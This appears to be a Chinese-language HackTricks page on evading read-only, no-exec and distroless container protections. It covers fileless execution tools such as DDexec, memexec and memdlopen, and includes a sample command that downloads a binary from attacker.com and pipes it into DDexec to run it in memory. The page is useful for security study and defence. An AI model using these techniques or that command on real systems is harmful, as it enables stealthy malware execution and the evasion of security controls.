# 绕过 FS protections：read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Videos

在以下视频中，可以找到本页面所述技术的更深入讲解：<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - 探索 Linux 内存操纵以实现隐蔽与规避**](https://www.youtube.com/watch?v=poHirez8jk4)。<sup>[[1]](#references)</sup>
- [**使用 DDexec-ng 和内存中的 dlopen() 进行隐蔽入侵 - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)。<sup>[[2]](#references)</sup>

## read-only / no-exec 场景

在容器中，可以通过在 security context 中设置 **`readOnlyRootFilesystem: true`**，将根文件系统挂载为只读。<sup>[[3]](#references)</sup>例如：

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

只读根文件系统不会使单独挂载的 volumes 也变为只读。Docker 将 **`/dev/shm`** 视为 IPC mount，而 `rw` 和 `noexec` 等 tmpfs 选项属于运行时配置选项；在依赖其中任一行为之前，应检查目标容器的 mount options。<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> 从 red-team 的角度来看，这种组合可能导致难以下载并执行尚未存在的 binaries（例如 backdoors 或 enumeration tools）。<sup>[[4]](#references)[[5]](#references)</sup>

## 最简单的绕过方式：Scripts

`noexec` mount 会阻止直接执行该 mount 上的 binaries，但 interpreter 仍然可以读取并解释执行 script。如果存在 `sh` 或 `python`，就可以通过相应的 interpreter 运行 shell 或 Python script。<sup>[[5]](#references)</sup>

当所需工具本身就是一个 binary 时，这种方法无法提供帮助。<sup>[[5]](#references)</sup>

## Memory Bypasses

当直接从某个挂载路径执行被阻止时，一种方案是将 ELF 加载到内存中，然后通过内存中的路径执行它。这可以绕过该 mount 上的 `noexec` 检查，但不会移除其他 kernel、permission 或 policy controls。<sup>[[5]](#references)[[6]](#references)</sup>

### FD + exec syscall bypass

如果 scripting runtime 能够访问相关的 Linux interface，它就可以使用 **`memfd_create(2)`** 创建一个匿名、由 RAM 支持的 file descriptor，将 ELF bytes 写入其中，然后使用基于 fd 的 execution path。项目 [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) 会为此 workflow 生成经过压缩并进行 base64 编码的 Python、Perl 或 Ruby code。<sup>[[6]](#references)[[7]](#references)</sup>

该项目目前记录了 Python、Perl 和 Ruby targets；PHP 或 Node 需要不同的 runtime-specific technique 或 extension，因此该语言没有对应 generator，并不意味着无法进行内存中的 execution。<sup>[[6]](#references)[[12]](#references)</sup>

> [!WARNING]
> 写入 **`/dev/shm`** 的普通 executable 仍受该 mount 的 **`noexec`** 设置限制；仅通过普通 file descriptor 打开它，并不会改变 mount policy。<sup>[[5]](#references)</sup>
>
> 具体的 memory-execution method 还取决于 runtime、architecture、kernel 和可用 permissions。<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) 通过 **`/proc/self/mem`** 将 stager 和 loader 写入正在运行的 shell process，然后将控制权转移给其中的 code。<sup>[[8]](#references)</sup>

这使 process 能够加载指定的 binary，而无需先将该 binary 放置在 executable filesystem 上。<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec** 可以从 **memory** 中加载并 **execute** shellcode 或 binary。<sup>[[8]](#references)</sup>
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
如需了解此 technique 的更多信息，请查看 Github 或：

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) 是一个 daemonized DDexec implementation。其 daemon 监听包含参数和原始程序字节的请求，fork 一个子进程来加载并运行每个程序，同时保留父进程作为 server。<sup>[[9]](#references)</sup>

该 repository 包含一个示例，展示如何使用 **memexec 从 PHP reverse shell 执行 binaries**，见 [a.php](https://github.com/arget13/memexec/blob/main/a.php)。<sup>[[9]](#references)</sup>

### Memdlopen

与 DDexec 目的类似，[**memdlopen**](https://github.com/arget13/memdlopen) 是针对 shared object 或 program 的无文件 `dlopen()` implementation。其 README 当前记录了对 ARM64 的支持，因此使用前请检查目标架构。<sup>[[10]](#references)</sup>

## Distroless Bypass

如需了解 **distroless 的实际含义**、它何时有帮助、何时没有帮助，以及它如何改变 containers 中的 post-exploitation tradecraft，请查看：

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### 什么是 distroless

Distroless images 只包含 application 及其 runtime dependencies；官方 images 会省略 package managers、shells 以及标准 Linux distribution 中通常包含的其他 programs。<sup>[[11]](#references)</sup>

将 runtime image 限制为这些 dependencies，可以减少 production 中存在的软件数量，以及需要扫描和跟踪的内容。<sup>[[11]](#references)</sup>

### Reverse Shell

在 distroless container 中，你可能**找不到 `sh` 或 `bash`** 来提供常规 shell，也可能找不到 `ls`、`whoami` 或 `id` 等常用 utilities。<sup>[[11]](#references)</sup>

> [!WARNING]
> 因此，常规的基于 shell 的 reverse shell 或基于 utility 的 enumeration 可能无法工作。<sup>[[11]](#references)</sup>

如果被 compromise 的 application 包含 language runtime（例如 Flask application 使用 Python，Node application 使用 Node.js），RCE 仍可能利用该 runtime，通过其 APIs 建立 command channel 并检查 system。<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> 利用可用的 scripting language，通过其 language capabilities **enumerate system**。<sup>[[12]](#references)</sup>

如果不存在 **read-only/no-exec** protections，command channel 可能会将 binaries 写入可写且可执行的 mount 并运行它们；请先验证 mount options 和 permissions。<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> 存在这些 protections 时，在 runtime、kernel 和 permissions 允许的情况下，使用上文的 **memory-execution techniques**。<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

你可以在 [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) 中找到利用 RCE vulnerabilities 获取 scripting-language **reverse shells** 并从 memory 执行 binaries 的**示例**。<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - 探索 Linux 内存操纵以实现隐蔽性和规避](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [使用 DDexec-ng 和 in-memory dlopen() 进行隐蔽入侵 - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [为 Pod 或 Container 配置 Security Context](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - Linux 手册页](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - Linux 手册页](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
